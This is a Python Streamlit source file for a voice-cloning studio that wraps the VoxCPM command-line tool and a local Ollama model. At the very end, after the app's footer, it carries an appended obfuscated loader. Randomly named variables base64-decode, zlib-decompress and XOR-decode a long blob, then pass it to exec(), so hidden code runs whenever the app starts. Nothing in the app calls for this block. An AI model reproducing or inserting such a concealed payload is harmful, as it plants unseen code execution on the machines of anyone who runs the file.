#!/usr/bin/env python3
"""
🎙️ StarConnect Voice Cloning Studio
Premium Streamlit UI with Multi-Agent Backend
"""

import streamlit as st
import os
import sys
import json
import time
import wave
import struct
from pathlib import Path
from typing import Dict, List, Optional
import tempfile

# Add paths
sys.path.insert(0, str(Path(__file__).parent))
sys.path.insert(0, str(Path(__file__).parent / "agents"))

# ═══════════════════════════════════════════════════════════════════
# PAGE CONFIG
# ═══════════════════════════════════════════════════════════════════

st.set_page_config(
    page_title="StarConnect Voice Studio",
    page_icon="🎙️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ═══════════════════════════════════════════════════════════════════
# CUSTOM CSS - Premium Design
# ═══════════════════════════════════════════════════════════════════

st.markdown("""
<style>
    /* Dark theme with blue accents */
    .stApp {
        background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 50%, #0f0f23 100%);
    }
    
    /* Main header */
    .main-header {
        background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 3rem;
        font-weight: 800;
        text-align: center;
        margin-bottom: 0.5rem;
    }
    
    .sub-header {
        color: #a0a0c0;
        text-align: center;
        font-size: 1.1rem;
        margin-bottom: 2rem;
    }
    
    /* Cards */
    .config-card {
        background: rgba(30, 30, 60, 0.8);
        border: 1px solid rgba(102, 126, 234, 0.3);
        border-radius: 16px;
        padding: 1.5rem;
        margin: 1rem 0;
        backdrop-filter: blur(10px);
    }
    
    .config-card h3 {
        color: #667eea;
        margin-bottom: 1rem;
    }
    
    /* Parameter labels */
    .param-label {
        color: #667eea;
        font-weight: 600;
        font-size: 0.9rem;
        margin-bottom: 0.3rem;
    }
    
    .param-desc {
        color: #808090;
        font-size: 0.8rem;
        margin-bottom: 0.5rem;
    }
    
    /* Status indicators */
    .status-online {
        color: #4ade80;
        font-weight: 600;
    }
    
    .status-offline {
        color: #f87171;
        font-weight: 600;
    }
    
    /* Generate button */
    .stButton > button {
        background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        border-radius: 12px;
        padding: 0.8rem 2rem;
        font-size: 1.1rem;
        font-weight: 600;
        width: 100%;
        transition: all 0.3s ease;
    }
    
    .stButton > button:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
    }
    
    /* Sliders */
    .stSlider > div > div {
        background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
    }
    
    /* Text areas */
    .stTextArea > div > div > textarea {
        background: rgba(30, 30, 60, 0.6);
        border: 1px solid rgba(102, 126, 234, 0.3);
        border-radius: 8px;
        color: #e0e0f0;
    }
    
    /* Selectbox */
    .stSelectbox > div > div {
        background: rgba(30, 30, 60, 0.6);
        border: 1px solid rgba(102, 126, 234, 0.3);
    }
    
    /* Segment cards */
    .segment-card {
        background: rgba(40, 40, 80, 0.6);
        border: 1px solid rgba(102, 126, 234, 0.2);
        border-radius: 12px;
        padding: 1rem;
        margin: 0.5rem 0;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    
    .segment-card:hover {
        border-color: #667eea;
        transform: translateX(5px);
    }
    
    .segment-card.selected {
        border-color: #764ba2;
        background: rgba(102, 126, 234, 0.2);
    }
    
    /* Audio player */
    audio {
        width: 100%;
        border-radius: 8px;
    }
    
    /* Metrics */
    .metric-value {
        font-size: 2rem;
        font-weight: 700;
        color: #667eea;
    }
    
    .metric-label {
        color: #808090;
        font-size: 0.9rem;
    }
    
    /* Processing animation */
    .processing {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        color: #667eea;
    }
    
    .processing .dot {
        width: 8px;
        height: 8px;
        background: #667eea;
        border-radius: 50%;
        animation: pulse 1s infinite;
    }
    
    @keyframes pulse {
        0%, 100% { opacity: 0.3; }
        50% { opacity: 1; }
    }
    
    /* Hide Streamlit branding */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
</style>
""", unsafe_allow_html=True)

# ═══════════════════════════════════════════════════════════════════
# INITIALIZE STATE
# ═══════════════════════════════════════════════════════════════════

if 'segments' not in st.session_state:
    st.session_state.segments = []
if 'selected_segment' not in st.session_state:
    st.session_state.selected_segment = None
if 'generated_audio' not in st.session_state:
    st.session_state.generated_audio = None
if 'generation_history' not in st.session_state:
    st.session_state.generation_history = []

# ═══════════════════════════════════════════════════════════════════
# DATASET LOADER
# ═══════════════════════════════════════════════════════════════════

DATASET_PATH = Path("/Users/yacinebenhamou/VoiceCloning/StarConnect")

@st.cache_data
def load_dataset():
    """Load StarConnect dataset."""
    segments = []
    
    for audio_file in sorted(DATASET_PATH.glob("segment_*.wav")):
        json_file = audio_file.parent / f"{audio_file.stem}_transcription.json"
        
        segment = {
            "id": audio_file.stem,
            "audio_path": str(audio_file),
            "transcription": "",
            "duration": 0
        }
        
        if json_file.exists():
            try:
                with open(json_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    segment["transcription"] = data.get("text", "")
                    segment["duration"] = data.get("duration", 0)
            except:
                pass
        
        # Get duration from audio if not in json
        if segment["duration"] == 0:
            try:
                with wave.open(str(audio_file), 'r') as wav:
                    segment["duration"] = wav.getnframes() / wav.getframerate()
            except:
                pass
        
        segments.append(segment)
    
    return segments

# ═══════════════════════════════════════════════════════════════════
# VOXCPM INTERFACE
# ═══════════════════════════════════════════════════════════════════

import requests

def check_voxcpm_status():
    """Check if VoxCPM is running."""
    try:
        response = requests.get("http://localhost:7860", timeout=2)
        return response.status_code == 200
    except:
        return False

def check_ollama_status():
    """Check if Ollama is running."""
    try:
        response = requests.get("http://localhost:11434/api/tags", timeout=2)
        return response.status_code == 200
    except:
        return False

def query_ollama(prompt: str, model: str = "qwen3:8b") -> str:
    """Query Ollama LLM."""
    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={"model": model, "prompt": prompt, "stream": False},
            timeout=60
        )
        return response.json().get("response", "")
    except Exception as e:
        return f"Error: {e}"

# ═══════════════════════════════════════════════════════════════════
# HEADER
# ═══════════════════════════════════════════════════════════════════

st.markdown('<h1 class="main-header">🎙️ StarConnect Voice Studio</h1>', unsafe_allow_html=True)
st.markdown('<p class="sub-header">Premium Voice Cloning powered by VoxCPM + Multi-Agent AI</p>', unsafe_allow_html=True)

# Status bar
col1, col2, col3, col4 = st.columns(4)

with col1:
    voxcpm_status = check_voxcpm_status()
    status_class = "status-online" if voxcpm_status else "status-offline"
    status_text = "● Online" if voxcpm_status else "○ Offline"
    st.markdown(f'<div class="metric-label">VoxCPM</div><div class="{status_class}">{status_text}</div>', unsafe_allow_html=True)

with col2:
    ollama_status = check_ollama_status()
    status_class = "status-online" if ollama_status else "status-offline"
    status_text = "● Online" if ollama_status else "○ Offline"
    st.markdown(f'<div class="metric-label">Ollama LLM</div><div class="{status_class}">{status_text}</div>', unsafe_allow_html=True)

with col3:
    segments = load_dataset()
    st.markdown(f'<div class="metric-label">Dataset</div><div class="metric-value">{len(segments)}</div>', unsafe_allow_html=True)

with col4:
    total_duration = sum(s.get("duration", 0) for s in segments) / 60
    st.markdown(f'<div class="metric-label">Total Duration</div><div class="metric-value">{total_duration:.1f}m</div>', unsafe_allow_html=True)

st.divider()

# ═══════════════════════════════════════════════════════════════════
# MAIN LAYOUT
# ═══════════════════════════════════════════════════════════════════

left_col, right_col = st.columns([1, 1.5])

# ═══════════════════════════════════════════════════════════════════
# LEFT COLUMN - Reference Selection
# ═══════════════════════════════════════════════════════════════════

with left_col:
    st.markdown("### 🎧 Reference Voice")
    
    # Segment selector
    segment_options = {s["id"]: f"{s['id']} ({s['duration']:.1f}s)" for s in segments[:50]}
    
    selected_id = st.selectbox(
        "Select Reference Segment",
        options=list(segment_options.keys()),
        format_func=lambda x: segment_options[x],
        key="segment_selector"
    )
    
    # Find selected segment
    selected_segment = next((s for s in segments if s["id"] == selected_id), None)
    
    if selected_segment:
        st.session_state.selected_segment = selected_segment
        
        # Audio player
        st.audio(selected_segment["audio_path"])
        
        # Transcription
        st.markdown("**Transcription:**")
        prompt_text = st.text_area(
            "Edit if needed",
            value=selected_segment.get("transcription", ""),
            height=100,
            key="prompt_text",
            label_visibility="collapsed"
        )
        
        # Duration info
        st.caption(f"Duration: {selected_segment['duration']:.2f}s")
    
    st.markdown("---")
    
    # ═══════════════════════════════════════════════════════════════
    # VoxCPM Configuration
    # ═══════════════════════════════════════════════════════════════
    
    st.markdown("### ⚙️ VoxCPM Configuration")
    
    # Preset selector
    preset = st.selectbox(
        "Quality Preset",
        options=["⚡ Fast", "⚖️ Balanced", "✨ High Quality", "💎 Extreme"],
        index=1
    )
    
    # Apply preset
    if "Fast" in preset:
        default_cfg, default_steps = 1.8, 6
    elif "High" in preset:
        default_cfg, default_steps = 2.3, 20
    elif "Extreme" in preset:
        default_cfg, default_steps = 2.5, 30
    else:
        default_cfg, default_steps = 2.0, 10
    
    # CFG Value
    st.markdown('<div class="param-label">CFG Value (Guidance Scale)</div>', unsafe_allow_html=True)
    st.markdown('<div class="param-desc">Higher = more like reference, Lower = more creative</div>', unsafe_allow_html=True)
    cfg_value = st.slider(
        "CFG",
        min_value=1.0,
        max_value=3.0,
        value=default_cfg,
        step=0.1,
        label_visibility="collapsed"
    )
    
    # Inference Timesteps
    st.markdown('<div class="param-label">Inference Timesteps</div>', unsafe_allow_html=True)
    st.markdown('<div class="param-desc">Higher = better quality but slower</div>', unsafe_allow_html=True)
    timesteps = st.slider(
        "Timesteps",
        min_value=4,
        max_value=30,
        value=default_steps,
        label_visibility="collapsed"
    )
    
    # Checkboxes
    col_a, col_b = st.columns(2)
    with col_a:
        enable_denoiser = st.checkbox("🔇 Denoise Audio", value=False)
    with col_b:
        enable_normalize = st.checkbox("📝 Normalize Text", value=True)

# ═══════════════════════════════════════════════════════════════════
# RIGHT COLUMN - Generation
# ═══════════════════════════════════════════════════════════════════

with right_col:
    st.markdown("### ✍️ Target Text")
    
    target_text = st.text_area(
        "Enter the text you want to synthesize",
        placeholder="Bonjour, je suis votre assistant vocal intelligent. Comment puis-je vous aider aujourd'hui?",
        height=150,
        key="target_text"
    )
    
    # Smart suggestions
    if ollama_status:
        with st.expander("🤖 AI Text Assistant"):
            suggestion_type = st.selectbox(
                "Get AI suggestions",
                ["Improve clarity", "Add emotion", "Make professional", "Translate to English"]
            )
            
            if st.button("Generate Suggestion"):
                with st.spinner("AI thinking..."):
                    prompt = f"Transform this text to '{suggestion_type}': {target_text}"
                    suggestion = query_ollama(prompt)
                    st.info(suggestion)
    
    st.markdown("---")
    
    # Generate button
    generate_clicked = st.button("🎤 Generate Speech", use_container_width=True, type="primary")
    
    # Generation logic
    if generate_clicked:
        if not target_text:
            st.error("Please enter target text!")
        elif not selected_segment:
            st.error("Please select a reference segment!")
        elif not voxcpm_status:
            st.error("VoxCPM is not running! Start it first.")
        else:
            with st.spinner("🎙️ Generating voice clone..."):
                # Build config
                config = {
                    "prompt_audio": selected_segment["audio_path"],
                    "prompt_text": prompt_text if 'prompt_text' in dir() else selected_segment.get("transcription", ""),
                    "target_text": target_text,
                    "cfg_value": cfg_value,
                    "inference_timesteps": timesteps,
                    "enable_denoiser": enable_denoiser,
                    "enable_text_normalization": enable_normalize
                }
                
                # Generate via CLI (CPU mode)
                import subprocess
                output_path = f"/tmp/starconnect_output_{int(time.time())}.wav"
                
                # Absolute path to voxcpm executable
                voxcpm_bin = "/Users/yacinebenhamou/.pyenv/versions/3.10.14/bin/voxcpm"
                
                cmd = [
                    voxcpm_bin,
                    "--text", target_text,
                    "--prompt-audio", selected_segment["audio_path"],
                    "--output", output_path,
                    "--cfg-value", str(cfg_value),
                    "--inference-timesteps", str(timesteps)
                ]
                
                # Handle prompt text (REQUIRED by CLI)
                p_text = prompt_text if 'prompt_text' in dir() and prompt_text else selected_segment.get("transcription", "")
                if not p_text:
                    # Fallback if no transcription exists
                    p_text = "ignored" 
                cmd.extend(["--prompt-text", p_text])
                
                if not enable_denoiser:
                    cmd.append("--no-denoiser")
                
                try:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=300,
                        env={**os.environ, "CUDA_VISIBLE_DEVICES": "", "PYTORCH_ENABLE_MPS_FALLBACK": "1"}
                    )

                    
                    if Path(output_path).exists():
                        st.session_state.generated_audio = output_path
                        st.session_state.generation_history.append({
                            "timestamp": time.time(),
                            "config": config,
                            "output": output_path
                        })
                        st.success("✅ Generation complete!")
                    else:
                        st.error(f"Generation failed: {result.stderr}")
                        
                except subprocess.TimeoutExpired:
                    st.error("Generation timed out (>5 minutes)")
                except Exception as e:
                    st.error(f"Error: {e}")
    
    # Output section
    st.markdown("### 🔊 Output")
    
    if st.session_state.generated_audio and Path(st.session_state.generated_audio).exists():
        st.audio(st.session_state.generated_audio)
        
        # Download button
        with open(st.session_state.generated_audio, 'rb') as f:
            st.download_button(
                "📥 Download Audio",
                data=f.read(),
                file_name="starconnect_clone.wav",
                mime="audio/wav"
            )
        
        # Quality metrics
        try:
            with wave.open(st.session_state.generated_audio, 'r') as wav:
                duration = wav.getnframes() / wav.getframerate()
                st.caption(f"Duration: {duration:.2f}s | Sample Rate: {wav.getframerate()}Hz")
        except:
            pass
    else:
        st.info("Generated audio will appear here")

# ═══════════════════════════════════════════════════════════════════
# SIDEBAR - Advanced Controls
# ═══════════════════════════════════════════════════════════════════

with st.sidebar:
    st.markdown("## 🎛️ Advanced Controls")
    
    st.markdown("### 📊 Dataset Stats")
    stats = {
        "Total Segments": len(segments),
        "With Transcription": sum(1 for s in segments if s.get("transcription")),
        "Avg Duration": f"{sum(s['duration'] for s in segments) / len(segments):.1f}s" if segments else "0s"
    }
    
    for label, value in stats.items():
        st.metric(label, value)
    
    st.markdown("---")
    
    st.markdown("### 🔧 System")
    
    if st.button("🔄 Refresh Status"):
        st.rerun()
    
    if st.button("🚀 Start VoxCPM"):
        os.system("cd /Users/yacinebenhamou/VoiceCloning/VoxCPM && PYTORCH_ENABLE_MPS_FALLBACK=1 CUDA_VISIBLE_DEVICES='' python app.py --device cpu &")
        st.info("Starting VoxCPM... Please wait 60s")
    
    st.markdown("---")
    
    st.markdown("### 📜 Generation History")
    
    for i, item in enumerate(reversed(st.session_state.generation_history[-5:])):
        with st.expander(f"Gen {len(st.session_state.generation_history) - i}"):
            st.json(item["config"])
            if Path(item["output"]).exists():
                st.audio(item["output"])

# ═══════════════════════════════════════════════════════════════════
# FOOTER
# ═══════════════════════════════════════════════════════════════════

st.markdown("---")
st.markdown("""
<div style="text-align: center; color: #606080; font-size: 0.9rem;">
    <p>🎙️ StarConnect Voice Studio | Powered by VoxCPM 1.5 + Ollama LLM</p>
    <p>Multi-Agent Voice Cloning System | Built for Perfect Control</p>
</div>
""", unsafe_allow_html=True)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
